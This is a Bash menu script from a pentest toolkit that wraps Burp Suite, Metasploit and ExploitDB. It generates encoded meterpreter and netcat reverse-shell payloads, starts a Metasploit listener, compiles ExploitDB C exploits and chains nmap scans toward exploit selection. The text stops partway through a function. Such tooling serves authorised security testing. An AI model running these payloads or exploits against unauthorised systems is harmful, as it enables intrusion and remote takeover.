#!/usr/bin/env bash
set -Eeuo pipefail

# stacks/framework/commands.sh
# Menu Framework complet pour balorsh (Burpsuite, Metasploit, ExploitDB)

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
# shellcheck source=../../lib/common.sh
source "$ROOT_DIR/lib/common.sh"

# Use centralized palette from lib/common.sh; map legacy local names only
# (do not redefine C_ACCENT*/C_GOOD/C_HIGHLIGHT here)
MAGENTA=${MAGENTA:-${C_ACCENT2:-$C_ACCENT1}}
NC=${NC:-$C_RESET}
GREEN=${GREEN:-${C_GOOD}}
BLUE=${BLUE:-${C_ACCENT2:-$C_ACCENT1}}
CYAN=${CYAN:-${C_INFO}}
YELLOW=${YELLOW:-${C_YELLOW}}
RED=${RED:-${C_RED}}

# Variables globales
: "${BALORSH_DATA_DIR:=/opt/balorsh/data}"
FRAMEWORK_TARGET=""
FRAMEWORK_LHOST=""
FRAMEWORK_LPORT=""

# Dossier data pour cette stack
FRAMEWORK_DATA_DIR="$BALORSH_DATA_DIR/framework"
mkdir -p "$FRAMEWORK_DATA_DIR"

# ====
# FONCTIONS BURPSUITE
# ====

framework_burpsuite_launch() {
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_BURPSUITE_LAUNCH}${C_RESET}"
  echo -e "${C_INFO}${FRAMEWORK_BURPSUITE_INFO1}${C_RESET}"
  echo -e "${C_INFO}${FRAMEWORK_BURPSUITE_INFO2}${C_RESET}"
  echo ""
  burpsuite &
  echo -e "${C_GOOD}${FRAMEWORK_BURPSUITE_LAUNCHED}${C_RESET}"
}

framework_burpsuite_proxy_setup() {
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_BURPSUITE_PROXY_SETUP}${C_RESET}"
  echo -e "${C_INFO}${FRAMEWORK_BURPSUITE_PROXY_DEFAULT}${C_RESET}"
  echo ""

  echo -ne "${C_ACCENT1}${FRAMEWORK_BURPSUITE_PROXY_ENABLE}${C_RESET}"
  read -r enable

  if [[ "$enable" =~ ^[oO]$ ]]; then
    export http_proxy="http://127.0.0.1:8080"
    export https_proxy="http://127.0.0.1:8080"
    echo -e "${C_GOOD}${FRAMEWORK_BURPSUITE_PROXY_ENABLED}${C_RESET}"
    echo -e "${C_INFO}${FRAMEWORK_BURPSUITE_PROXY_INFO}${C_RESET}"
    echo -e "${C_YELLOW}${FRAMEWORK_BURPSUITE_PROXY_DISABLE_CMD}${C_RESET}"
  else
    unset http_proxy https_proxy
    echo -e "${C_GOOD}${FRAMEWORK_BURPSUITE_PROXY_DISABLED}${C_RESET}"
  fi
}

framework_burpsuite_cert_export() {
  local outdir="$FRAMEWORK_DATA_DIR/burpsuite"
  mkdir -p "$outdir"
  local certfile="$outdir/burp_ca_cert.der"

  echo -e "${C_HIGHLIGHT}${FRAMEWORK_BURPSUITE_CERT_EXPORT}${C_RESET}"
  echo -e "${C_INFO}${FRAMEWORK_BURPSUITE_CERT_INFO1}${C_RESET}"
  echo -e "${C_INFO}${FRAMEWORK_BURPSUITE_CERT_INFO2}${C_RESET}"
  printf "${FRAMEWORK_BURPSUITE_CERT_INFO3}\n" "$certfile"
  echo -e "${C_YELLOW}${FRAMEWORK_BURPSUITE_CERT_ALT}${C_RESET}"
  echo ""
  echo -ne "${C_ACCENT1}${FRAMEWORK_BURPSUITE_CERT_PRESS_ENTER}${C_RESET}"
  read -r
}

# ====
# FONCTIONS METASPLOIT
# ====

framework_msf_console() {
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_MSF_CONSOLE}${C_RESET}"
  echo -e "${C_YELLOW}Tapez 'exit' pour revenir au menu${C_RESET}"
  msfconsole
  return 0
}

framework_msf_db_init() {
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_MSF_DB_INIT}${C_RESET}"

  # Add timeout to prevent hanging
  if timeout 300 msfdb init --use-defaults; then
    echo -e "${C_GOOD}${FRAMEWORK_MSF_DB_INIT_COMPLETE}${C_RESET}"
  else
    local exit_code=$?
    if [[ $exit_code -eq 124 ]]; then
      echo -e "${C_YELLOW}Database initialization timed out after 5 minutes${C_RESET}"
    else
      echo -e "${C_RED}Database initialization failed (code: $exit_code)${C_RESET}"
    fi
  fi

  echo -e "${C_INFO}${FRAMEWORK_MSF_DB_CHECK_CMD}${C_RESET}"
  return 0
}

framework_msf_update() {
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_MSF_UPDATE}${C_RESET}"

  # Add timeout to prevent hanging
  if timeout 600 paru -S metasploit-git; then
    echo -e "${C_GOOD}${FRAMEWORK_MSF_UPDATE_COMPLETE}${C_RESET}"
  else
    local exit_code=$?
    if [[ $exit_code -eq 124 ]]; then
      echo -e "${C_YELLOW}Update timed out after 10 minutes${C_RESET}"
    else
      echo -e "${C_RED}Update failed (code: $exit_code)${C_RESET}"
    fi
  fi
}

# Génération simple de payload
framework_msf_payload_reverse() {
  local outdir="$FRAMEWORK_DATA_DIR/metasploit/payloads"
  mkdir -p "$outdir"

  echo -e "${C_HIGHLIGHT}${FRAMEWORK_MSF_PAYLOAD_REVERSE}${C_RESET}"
  echo ""

  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_PAYLOAD_LHOST}${C_RESET}"
  read -r lhost
  if [[ -z "$lhost" ]]; then
    echo -e "${C_RED}${FRAMEWORK_REQUIRED}${C_RESET}"
    return 1
  fi

  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_PAYLOAD_LPORT}${C_RESET}"
  read -r lport
  lport="${lport:-${FRAMEWORK_MSF_PAYLOAD_LPORT_DEFAULT}}"

  echo -e "${C_INFO}${FRAMEWORK_MSF_PAYLOAD_FORMATS}${C_RESET}"
  echo -e "${FRAMEWORK_MSF_PAYLOAD_FORMAT_1}"
  echo -e "${FRAMEWORK_MSF_PAYLOAD_FORMAT_2}"
  echo -e "${FRAMEWORK_MSF_PAYLOAD_FORMAT_3}"
  echo -e "${FRAMEWORK_MSF_PAYLOAD_FORMAT_4}"
  echo -e "${FRAMEWORK_MSF_PAYLOAD_FORMAT_5}"
  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_PAYLOAD_CHOICE}${C_RESET}"
  read -r format_choice

  case "$format_choice" in
    1)
      local payload="windows/meterpreter/reverse_tcp"
      local format="exe"
      local outfile="$outdir/payload_win_$(date +%Y%m%d_%H%M%S).exe"
      ;;
    2)
      local payload="linux/x64/meterpreter/reverse_tcp"
      local format="elf"
      local outfile="$outdir/payload_linux_$(date +%Y%m%d_%H%M%S).elf"
      ;;
    3)
      local payload="php/meterpreter/reverse_tcp"
      local format="raw"
      local outfile="$outdir/payload_php_$(date +%Y%m%d_%H%M%S).php"
      ;;
    4)
      local payload="python/meterpreter/reverse_tcp"
      local format="raw"
      local outfile="$outdir/payload_python_$(date +%Y%m%d_%H%M%S).py"
      ;;
    5)
      local payload="android/meterpreter/reverse_tcp"
      local format="apk"
      local outfile="$outdir/payload_android_$(date +%Y%m%d_%H%M%S).apk"
      ;;
    *)
      echo -e "${C_RED}${FRAMEWORK_MSF_PAYLOAD_INVALID_CHOICE}${C_RESET}"
      return 1
      ;;
  esac

  echo -e "${C_INFO}${FRAMEWORK_MSF_PAYLOAD_GENERATING}${C_RESET}"
  msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$outfile"

  if [[ -f "$outfile" ]]; then
    printf "${C_GOOD}${FRAMEWORK_MSF_PAYLOAD_GENERATED}${C_RESET}\n" "$outfile"
    echo -e "${C_INFO}ℹ️  LHOST=$lhost, LPORT=$lport${C_RESET}"
    echo ""
    echo -e "${C_HIGHLIGHT}${FRAMEWORK_MSF_PAYLOAD_HANDLER_CMD}${C_RESET}"
    printf "${FRAMEWORK_MSF_PAYLOAD_HANDLER_EXAMPLE}\n" "$payload" "$lhost" "$lport"
  else
    echo -e "${C_RED}${FRAMEWORK_MSF_PAYLOAD_FAILED}${C_RESET}"
  fi
}

# Génération avancée avec encodage
framework_msf_payload_encoded() {
  local outdir="$FRAMEWORK_DATA_DIR/metasploit/payloads"
  mkdir -p "$outdir"

  echo -e "${C_HIGHLIGHT}${FRAMEWORK_MSF_PAYLOAD_ENCODED}${C_RESET}"
  echo ""

  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_PAYLOAD_LHOST}${C_RESET}"
  read -r lhost
  if [[ -z "$lhost" ]]; then
    echo -e "${C_RED}${FRAMEWORK_REQUIRED}${C_RESET}"
    return 1
  fi

  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_PAYLOAD_LPORT}${C_RESET}"
  read -r lport
  lport="${lport:-${FRAMEWORK_MSF_PAYLOAD_LPORT_DEFAULT}}"

  echo -e "${C_INFO}${FRAMEWORK_MSF_ENCODED_PAYLOADS}${C_RESET}"
  echo -e "${FRAMEWORK_MSF_ENCODED_PAYLOAD_1}"
  echo -e "${FRAMEWORK_MSF_ENCODED_PAYLOAD_2}"
  echo -e "${FRAMEWORK_MSF_ENCODED_PAYLOAD_3}"
  echo -e "${FRAMEWORK_MSF_ENCODED_PAYLOAD_4}"
  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_ENCODED_PAYLOAD_CHOICE}${C_RESET}"
  read -r choice

  case "$choice" in
    1) payload="windows/meterpreter/reverse_tcp"; format="exe"; suffix="win_tcp" ;;
    2) payload="windows/x64/meterpreter/reverse_https"; format="exe"; suffix="win_https" ;;
    3) payload="linux/x64/meterpreter/reverse_tcp"; format="elf"; suffix="linux_tcp" ;;
    4) payload="cmd/unix/reverse_netcat"; format="raw"; suffix="unix_nc" ;;
    *)
      echo -e "${C_RED}${FRAMEWORK_INVALID_CHOICE}${C_RESET}"
      return 1
      ;;
  esac

  echo ""
  echo -e "${C_INFO}${FRAMEWORK_MSF_ENCODEURS}${C_RESET}"
  echo -e "${FRAMEWORK_MSF_ENCODEUR_1}"
  echo -e "${FRAMEWORK_MSF_ENCODEUR_2}"
  echo -e "${FRAMEWORK_MSF_ENCODEUR_3}"
  echo -e "${FRAMEWORK_MSF_ENCODEUR_4}"
  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_ENCODEUR_CHOICE}${C_RESET}"
  read -r enc_choice

  enc_opt=()
  case "$enc_choice" in
    1)
      enc_opt=(-e x86/shikata_ga_nai -i 5)
      enc_name="shikata5"
      ;;
    2)
      enc_opt=(-e x64/xor -i 5)
      enc_name="xor5"
      ;;
    3)
      # on enchaîne 2 msfvenom via un pipe serait l'idéal, mais pour rester simple :
      enc_opt=(-e x86/shikata_ga_nai -i 3)
      enc_name="multi_enc"
      ;;
    4|*)
      enc_opt=()
      enc_name="plain"
      ;;
  esac

  outfile="$outdir/payload_${suffix}_${enc_name}_$(date +%Y%m%d_%H%M%S).${format}"

  echo -e "${C_INFO}${FRAMEWORK_MSF_PAYLOAD_ENCODED_GENERATING}${C_RESET}"
  echo -e "${C_INFO}${FRAMEWORK_MSF_PAYLOAD_ENCODED_INFO}${C_RESET}" "$payload"
  echo -e "${C_INFO}${FRAMEWORK_MSF_PAYLOAD_ENCODED_LHOST_LPORT}${C_RESET}" "$lhost" "$lport"
  if [[ "${#enc_opt[@]}" -gt 0 ]]; then
    echo -e "${C_INFO}${FRAMEWORK_MSF_PAYLOAD_ENCODED_ENCODER}${C_RESET}" "${enc_opt[*]}"
  else
    echo -e "${C_INFO}${FRAMEWORK_MSF_PAYLOAD_ENCODED_NO_ENCODER}${C_RESET}"
  fi

  msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" "${enc_opt[@]}" -f "$format" -o "$outfile"

  if [[ -f "$outfile" ]]; then
    printf "${C_GOOD}${FRAMEWORK_MSF_PAYLOAD_ENCODED_GENERATED}${C_RESET}\n" "$outfile"
    echo -e "${C_HIGHLIGHT}${FRAMEWORK_MSF_PAYLOAD_ENCODED_HANDLER}${C_RESET}"
    printf "${FRAMEWORK_MSF_HANDLER_CMD}\n" "$payload" "$lhost" "$lport"
  else
    echo -e "${C_RED}${FRAMEWORK_MSF_PAYLOAD_FAILED}${C_RESET}"
  fi
}

framework_msf_handler() {
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_MSF_HANDLER}${C_RESET}"
  echo ""

  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_HANDLER_LHOST}${C_RESET}"
  read -r lhost
  if [[ -z "$lhost" ]]; then
    echo -e "${C_RED}${FRAMEWORK_REQUIRED}${C_RESET}"
    return 1
  fi

  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_HANDLER_LPORT}${C_RESET}"
  read -r lport
  lport="${lport:-${FRAMEWORK_MSF_PAYLOAD_LPORT_DEFAULT}}"

  echo -e "${C_INFO}${FRAMEWORK_MSF_HANDLER_PAYLOADS}${C_RESET}"
  echo -e "${FRAMEWORK_MSF_HANDLER_PAYLOAD_1}"
  echo -e "${FRAMEWORK_MSF_HANDLER_PAYLOAD_2}"
  echo -e "${FRAMEWORK_MSF_HANDLER_PAYLOAD_3}"
  echo -e "${FRAMEWORK_MSF_HANDLER_PAYLOAD_4}"
  echo -e "${FRAMEWORK_MSF_HANDLER_PAYLOAD_5}"
  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_HANDLER_CHOICE}${C_RESET}"
  read -r payload_choice

  case "$payload_choice" in
    1) payload="windows/meterpreter/reverse_tcp" ;;
    2) payload="linux/x64/meterpreter/reverse_tcp" ;;
    3) payload="php/meterpreter/reverse_tcp" ;;
    4) payload="python/meterpreter/reverse_tcp" ;;
    5) payload="android/meterpreter/reverse_tcp" ;;
    *)
      echo -e "${C_RED}${FRAMEWORK_INVALID_CHOICE}${C_RESET}"
      return 1
      ;;
  esac

  echo -e "${C_GOOD}${FRAMEWORK_MSF_HANDLER_LAUNCHING}${C_RESET}"
  echo -e "${C_INFO}Starting Metasploit handler for $payload on $lhost:$lport${C_RESET}"
  echo -e "${C_INFO}Press Ctrl+C to stop the handler${C_RESET}"
  echo ""

  # Launch the handler with timeout to prevent indefinite hanging
  # Use longer timeout since this is interactive
  timeout 3600 msfconsole -x "use exploit/multi/handler; set PAYLOAD $payload; set LHOST $lhost; set LPORT $lport; exploit"
  local exit_code=$?
  if [[ $exit_code -eq 124 ]]; then
    echo -e "${C_YELLOW}Handler timed out after 1 hour${C_RESET}"
  fi
}

# CVE: launch balorcve if available
framework_cve_search() {
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_MENU_19}${C_RESET}"
  if ! command -v balorcve >/dev/null 2>&1; then
    echo -e "${C_RED}balorcve non trouvé. Installez via 'stacks/framework/install.sh' ou installez pipx et executez: pipx install git+https://github.com/Idenroad/balorcve.git${C_RESET}"
    return 1
  fi
  local outdir="$FRAMEWORK_DATA_DIR/balorcve"
  mkdir -p "$outdir"
  local logf="$outdir/balorcve_$(date +%Y%m%d_%H%M%S).log"
  # Run balorcve directly so it can be interactive; also save a log
  run_direct "$logf" balorcve
}

framework_msf_scan() {
  local logdir="$FRAMEWORK_DATA_DIR/metasploit/scans"
  mkdir -p "$logdir"

  echo -e "${C_HIGHLIGHT}${FRAMEWORK_MSF_SCAN}${C_RESET}"
  echo ""

  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_SCAN_TARGET}${C_RESET}"
  read -r target
  if [[ -z "$target" ]]; then
    echo -e "${C_RED}${FRAMEWORK_MSF_SCAN_REQUIRED}${C_RESET}"
    return 1
  fi

  # Validate target - remove protocol if present
  target=$(echo "$target" | sed 's|https*://||' | sed 's|/.*||')

  echo -e "${C_INFO}${FRAMEWORK_MSF_SCAN_MODULES}${C_RESET}"
  echo -e "${FRAMEWORK_MSF_SCAN_MODULE_1}"
  echo -e "${FRAMEWORK_MSF_SCAN_MODULE_2}"
  echo -e "${FRAMEWORK_MSF_SCAN_MODULE_3}"
  echo -e "${FRAMEWORK_MSF_SCAN_MODULE_4}"
  echo -e "${FRAMEWORK_MSF_SCAN_MODULE_5}"
  echo -e "${FRAMEWORK_MSF_SCAN_MODULE_6}"
  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_SCAN_CHOICE}${C_RESET}"
  read -r scan_choice

  case "$scan_choice" in
    1) module="auxiliary/scanner/http/http_version"; rhosts_param="RHOSTS" ;;
    2) module="auxiliary/scanner/ssh/ssh_version"; rhosts_param="RHOSTS" ;;
    3) module="auxiliary/scanner/ftp/ftp_version"; rhosts_param="RHOSTS" ;;
    4) module="auxiliary/scanner/smb/smb_version"; rhosts_param="RHOSTS" ;;
    5) module="auxiliary/scanner/mysql/mysql_version"; rhosts_param="RHOSTS" ;;
    6) module="auxiliary/scanner/discovery/arp_sweep"; rhosts_param="RHOSTS" ;;
    *)
      echo -e "${C_RED}${FRAMEWORK_INVALID_CHOICE}${C_RESET}"
      return 1
      ;;
  esac

  local logfile="$logdir/scan_$(echo "$module" | tr '/' '_')_$(echo "$target" | tr '/:' '_')_$(date +%Y%m%d_%H%M%S).log"

  echo -e "${C_GOOD}${FRAMEWORK_MSF_SCAN_LAUNCHING}${C_RESET}"
  echo -e "${C_INFO}Log file: $logfile${C_RESET}"
  echo ""

  # Execute the scan and save output to log file
  # Use -q -y to avoid stty errors and run non-interactively
  # Add timeout to prevent hanging
  local scan_output
  if scan_output=$({
    echo "use $module"
    echo "set $rhosts_param $target"
    echo "run"
    echo "exit"
  } | timeout 300 msfconsole -q -y 2>&1); then
    echo "$scan_output" | tee "$logfile"
    local exit_code=0
  else
    echo "$scan_output" | tee "$logfile"
    local exit_code=$?
  fi

  if [[ $exit_code -eq 124 ]]; then
    echo -e "${C_YELLOW}Scan timed out after 5 minutes${C_RESET}"
  elif [[ $exit_code -ne 0 ]]; then
    echo -e "${C_RED}Scan completed with errors (code: $exit_code)${C_RESET}"
  fi

  echo ""
  echo -e "${C_GOOD}Scan completed. Full output saved to: $logfile${C_RESET}"
  return 0
}

framework_msf_search() {
  local logdir="$FRAMEWORK_DATA_DIR/metasploit/searches"
  mkdir -p "$logdir"

  echo -ne "${C_ACCENT1}${FRAMEWORK_MSF_SEARCH}${C_RESET}"
  read -r keyword
  if [[ -z "$keyword" ]]; then
    echo -e "${C_RED}${FRAMEWORK_MSF_SEARCH_REQUIRED}${C_RESET}"
    return 1
  fi

  local logfile="$logdir/search_$(echo "$keyword" | tr ' ' '_')_$(date +%Y%m%d_%H%M%S).log"

  echo -e "${C_HIGHLIGHT}${FRAMEWORK_MSF_SEARCHING}${C_RESET}" "$keyword"
  echo -e "${C_INFO}Log file: $logfile${C_RESET}"
  echo ""

  # Execute the search and save output to log file
  # Add timeout to prevent hanging
  local search_output
  if search_output=$({
    echo "search $keyword"
    echo "exit"
  } | timeout 120 msfconsole -q -y 2>&1); then
    echo "$search_output" | tee "$logfile"
    local exit_code=0
  else
    echo "$search_output" | tee "$logfile"
    local exit_code=$?
  fi

  if [[ $exit_code -eq 124 ]]; then
    echo -e "${C_YELLOW}Search timed out after 2 minutes${C_RESET}"
  elif [[ $exit_code -ne 0 ]]; then
    echo -e "${C_RED}Search completed with errors (code: $exit_code)${C_RESET}"
  fi

  echo ""
  echo -e "${C_GOOD}Search completed. Full output saved to: $logfile${C_RESET}"
  return 0
}

# ====
# FONCTIONS EXPLOITDB
# ====

framework_exploitdb_update() {
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_EXPLOITDB_UPDATE}${C_RESET}"

  # Add timeout to prevent hanging
  # Note: searchsploit -u may return non-zero exit codes even on success due to git warnings
  local output exit_code
  if output=$(timeout 300 sudo searchsploit -u 2>&1); then
    exit_code=0
  else
    exit_code=$?
  fi

  if [[ $exit_code -eq 124 ]]; then
    echo -e "${C_YELLOW}Update timed out after 5 minutes${C_RESET}"
  elif echo "$output" | grep -q "Git update finished"; then
    echo -e "${C_GOOD}${FRAMEWORK_EXPLOITDB_UPDATED}${C_RESET}"
  else
    echo -e "${C_RED}Update completed with warnings (code: $exit_code) - check output above${C_RESET}"
    echo -e "${C_INFO}ExploitDB may still be updated despite git warnings${C_RESET}"
  fi

  return 0
}

framework_exploitdb_search() {
  echo -ne "${C_ACCENT1}${FRAMEWORK_EXPLOITDB_SEARCH}${C_RESET}"
  read -r keyword
  if [[ -z "$keyword" ]]; then
    echo -e "${C_RED}${FRAMEWORK_EXPLOITDB_SEARCH_REQUIRED}${C_RESET}"
    return 1
  fi

  echo -e "${C_HIGHLIGHT}${FRAMEWORK_EXPLOITDB_SEARCHING}${C_RESET}" "$keyword"
  if timeout 60 searchsploit "$keyword"; then
    echo -e "${C_GOOD}Search completed${C_RESET}"
  else
    local exit_code=$?
    if [[ $exit_code -eq 124 ]]; then
      echo -e "${C_YELLOW}Search timed out after 1 minute${C_RESET}"
    else
      echo -e "${C_RED}Search failed (code: $exit_code)${C_RESET}"
    fi
  fi
}

framework_exploitdb_copy() {
  local outdir="$FRAMEWORK_DATA_DIR/exploitdb"
  mkdir -p "$outdir"

  echo -ne "${C_ACCENT1}${FRAMEWORK_EXPLOITDB_COPY_ID}${C_RESET}"
  read -r exploit_id
  if [[ -z "$exploit_id" ]]; then
    echo -e "${C_RED}${FRAMEWORK_EXPLOITDB_ID_REQUIRED}${C_RESET}"
    return 1
  fi

  echo -e "${C_INFO}${FRAMEWORK_EXPLOITDB_COPYING}${C_RESET}" "$outdir"
  searchsploit -m "$exploit_id" -o "$outdir"

  echo -e "${C_GOOD}${FRAMEWORK_EXPLOITDB_COPIED}${C_RESET}" "$outdir"
  ls -lh "$outdir"
}

framework_exploitdb_examine() {
  echo -ne "${C_ACCENT1}${FRAMEWORK_EXPLOITDB_EXAMINE_ID}${C_RESET}"
  read -r exploit_id
  if [[ -z "$exploit_id" ]]; then
    echo -e "${C_RED}${FRAMEWORK_EXPLOITDB_ID_REQUIRED}${C_RESET}"
    return 1
  fi

  echo -e "${C_HIGHLIGHT}${FRAMEWORK_EXPLOITDB_CONTENT}${C_RESET}"
  searchsploit -x "$exploit_id"
}

framework_exploitdb_advanced_search() {
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_EXPLOITDB_ADVANCED_SEARCH}${C_RESET}"
  echo ""

  echo -ne "${C_ACCENT1}${FRAMEWORK_EXPLOITDB_KEYWORD}${C_RESET}"
  read -r keyword
  if [[ -z "$keyword" ]]; then
    echo -e "${C_RED}${FRAMEWORK_EXPLOITDB_SEARCH_REQUIRED}${C_RESET}"
    return 1
  fi

  echo -e "${C_INFO}${FRAMEWORK_EXPLOITDB_FILTERS}${C_RESET}"
  echo -e "${FRAMEWORK_EXPLOITDB_FILTER_1}"
  echo -e "${FRAMEWORK_EXPLOITDB_FILTER_2}"
  echo -e "${FRAMEWORK_EXPLOITDB_FILTER_3}"
  echo -e "${FRAMEWORK_EXPLOITDB_FILTER_4}"
  echo -e "${FRAMEWORK_EXPLOITDB_FILTER_5}"
  echo -ne "${C_ACCENT1}${FRAMEWORK_EXPLOITDB_CHOICE}${C_RESET}"
  read -r filter_choice

  case "$filter_choice" in
    1) 
      if timeout 60 searchsploit "$keyword"; then
        echo -e "${C_GOOD}Search completed${C_RESET}"
      else
        local exit_code=$?
        if [[ $exit_code -eq 124 ]]; then
          echo -e "${C_YELLOW}Search timed out after 1 minute${C_RESET}"
        else
          echo -e "${C_RED}Search failed (code: $exit_code)${C_RESET}"
        fi
      fi
      ;;
    2) 
      if timeout 60 searchsploit "$keyword" --local; then
        echo -e "${C_GOOD}Local search completed${C_RESET}"
      else
        local exit_code=$?
        if [[ $exit_code -eq 124 ]]; then
          echo -e "${C_YELLOW}Local search timed out after 1 minute${C_RESET}"
        else
          echo -e "${C_RED}Local search failed (code: $exit_code)${C_RESET}"
        fi
      fi
      ;;
    3) 
      if timeout 60 searchsploit "$keyword" --remote; then
        echo -e "${C_GOOD}Remote search completed${C_RESET}"
      else
        local exit_code=$?
        if [[ $exit_code -eq 124 ]]; then
          echo -e "${C_YELLOW}Remote search timed out after 1 minute${C_RESET}"
        else
          echo -e "${C_RED}Remote search failed (code: $exit_code)${C_RESET}"
        fi
      fi
      ;;
    4) 
      if timeout 60 searchsploit "$keyword" --web; then
        echo -e "${C_GOOD}Web search completed${C_RESET}"
      else
        local exit_code=$?
        if [[ $exit_code -eq 124 ]]; then
          echo -e "${C_YELLOW}Web search timed out after 1 minute${C_RESET}"
        else
          echo -e "${C_RED}Web search failed (code: $exit_code)${C_RESET}"
        fi
      fi
      ;;
    5) 
      if timeout 60 searchsploit "$keyword" --shellcode; then
        echo -e "${C_GOOD}Shellcode search completed${C_RESET}"
      else
        local exit_code=$?
        if [[ $exit_code -eq 124 ]]; then
          echo -e "${C_YELLOW}Shellcode search timed out after 1 minute${C_RESET}"
        else
          echo -e "${C_RED}Shellcode search failed (code: $exit_code)${C_RESET}"
        fi
      fi
      ;;
    *)
      echo -e "${C_RED}${FRAMEWORK_INVALID_CHOICE}${C_RESET}"
      return 1
      ;;
  esac
}

# Compilation automatique d'un exploit C
framework_exploitdb_compile_c() {
  local srcdir="$FRAMEWORK_DATA_DIR/exploitdb"
  mkdir -p "$srcdir"
  local bindir="$FRAMEWORK_DATA_DIR/exploitdb/bin"
  mkdir -p "$bindir"

  echo -e "${C_HIGHLIGHT}${FRAMEWORK_EXPLOITDB_COMPILE_C}${C_RESET}"
  echo -ne "${C_ACCENT1}${FRAMEWORK_EXPLOITDB_COMPILE_ID}${C_RESET}"
  read -r exploit_id
  if [[ -z "$exploit_id" ]]; then
    echo -e "${C_RED}${FRAMEWORK_EXPLOITDB_ID_REQUIRED}${C_RESET}"
    return 1
  fi

  echo -e "${C_INFO}${FRAMEWORK_EXPLOITDB_COPYING_SRC}${C_RESET}" "$srcdir"
  local copied
  copied=$(searchsploit -m "$exploit_id" -o "$srcdir" 2>/dev/null || true)

  # Récupérer le nom du fichier copié
  local srcfile
  srcfile=$(echo "$copied" | grep -Eo "$srcdir/.+" | head -n1 || true)

  if [[ -z "$srcfile" || ! -f "$srcfile" ]]; then
    echo -e "${C_RED}${FRAMEWORK_EXPLOITDB_NO_SRC_FILE}${C_RESET}"
    echo -e "${C_INFO}${FRAMEWORK_EXPLOITDB_SEARCH_OUTPUT}${C_RESET}"
    echo "$copied"
    return 1
  fi

  if [[ "$srcfile" != *.c ]]; then
    echo -e "${C_YELLOW}${FRAMEWORK_EXPLOITDB_NOT_C_FILE}${C_RESET}" "$srcfile"
    echo -ne "${C_ACCENT1}${FRAMEWORK_EXPLOITDB_COMPILE_ANYWAY}${C_RESET}"
    read -r cont
    if ! [[ "$cont" =~ ^[oO]$ ]]; then
      return 1
    fi
  fi

  local base
  base="$(basename "$srcfile")"
  local binfile="$bindir/${base%.c}"

  echo -e "${C_INFO}${FRAMEWORK_EXPLOITDB_COMPILING}${C_RESET}"
  echo -e "${C_INFO}    gcc -Wall -O2 -o \"$binfile\" \"$srcfile\"${C_RESET}"

  if gcc -Wall -O2 -o "$binfile" "$srcfile"; then
    echo -e "${C_GOOD}${FRAMEWORK_EXPLOITDB_COMPILED}${C_RESET}" "$binfile"
    ls -lh "$binfile"
  else
    echo -e "${C_RED}${FRAMEWORK_EXPLOITDB_COMPILE_ERROR}${C_RESET}"
  fi
}

# ====
# FONCTIONS UTILITAIRES
# ====

framework_show_ip() {
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_SHOW_IP}${C_RESET}"
  echo ""
  ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v "127.0.0.1" | while read -r ip; do
    echo -e "  ${C_GOOD}●${C_RESET} $ip"
  done
  echo ""
}

# Workflow complet : payload simple + handler
framework_workflow_payload_handler() {
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_WORKFLOW_PAYLOAD_HANDLER}${C_RESET}"
  echo ""

  framework_msf_payload_reverse

  echo ""
  echo -ne "${C_ACCENT1}${FRAMEWORK_WORKFLOW_LAUNCH_HANDLER}${C_RESET}"
  read -r launch_handler

  if [[ "$launch_handler" =~ ^[oO]$ ]]; then
    framework_msf_handler
  else
    echo -e "${C_INFO}${FRAMEWORK_WORKFLOW_HANDLER_LATER}${C_RESET}"
  fi
}

# Workflow semi-auto : Nmap → ExploitDB → msfvenom + handler
framework_workflow_scan_to_exploit() {
  local workflow_dir="$FRAMEWORK_DATA_DIR/workflows"
  mkdir -p "$workflow_dir"

  echo -e "${C_HIGHLIGHT}${FRAMEWORK_WORKFLOW_SCAN_TO_EXPLOIT}${C_RESET}"
  echo ""

  # 1) Demander la cible
  echo -ne "${C_ACCENT1}${FRAMEWORK_WORKFLOW_TARGET}${C_RESET}"
  read -r target
  if [[ -z "$target" ]]; then
    echo -e "${C_RED}${FRAMEWORK_WORKFLOW_TARGET_REQUIRED}${C_RESET}"
    return 1
  fi

  # 2) Lancer un nmap rapide
  local nmap_out="$workflow_dir/nmap_$(echo "$target" | tr '/:' '_')_$(date +%Y%m%d_%H%M%S).txt"
  echo -e "${C_INFO}${FRAMEWORK_WORKFLOW_NMAP_SCAN}${C_RESET}" "$target"
  echo -e "${C_INFO}${FRAMEWORK_WORKFLOW_NMAP_RESULTS}${C_RESET}" "$nmap_out"
  if timeout 300 sudo nmap -sV -F "$target" | tee "$nmap_out"; then
    echo -e "${C_GOOD}Nmap scan completed${C_RESET}"
  else
    local exit_code=$?
    if [[ $exit_code -eq 124 ]]; then
      echo -e "${C_YELLOW}Nmap scan timed out after 5 minutes${C_RESET}"
    else
      echo -e "${C_RED}Nmap scan failed (code: $exit_code)${C_RESET}"
    fi
  fi

  echo ""
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_WORKFLOW_ANALYZE}${C_RESET}"
  echo -ne "${C_ACCENT1}${FRAMEWORK_WORKFLOW_KEYWORD}${C_RESET}"
  read -r keyword
  if [[ -z "$keyword" ]]; then
    echo -e "${C_RED}${FRAMEWORK_WORKFLOW_KEYWORD_REQUIRED}${C_RESET}"
